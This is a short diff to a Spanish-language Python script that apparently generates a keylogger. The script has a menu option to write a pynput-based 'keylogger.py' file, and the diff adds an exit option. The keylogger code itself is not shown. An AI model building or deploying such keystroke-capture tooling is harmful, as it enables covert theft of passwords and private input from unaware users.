@@ -10,6 +10,7 @@ os.system("clear && figlet Keylogger | lolcat")
 def menu_principal():
     while True:
         print("\n[1] Crear keylogger")
+        print("[2] Salir")
         opcion = input("\033[1m\n[+] Ingrese una opción: \033[0m")
         if opcion == "1":
             codigo = '''from pynput import keyboard
@@ -41,5 +42,8 @@ if __name__ == "__main__":
             with open("keylogger.py", "w") as archivo:
                 archivo.write(codigo)
                 print("\033[1m\n[+] Se ha creado el archivo 'keylogger.py'\033[0m")
+        
+        if opcion == "2":
+            break
 
 menu_principal()
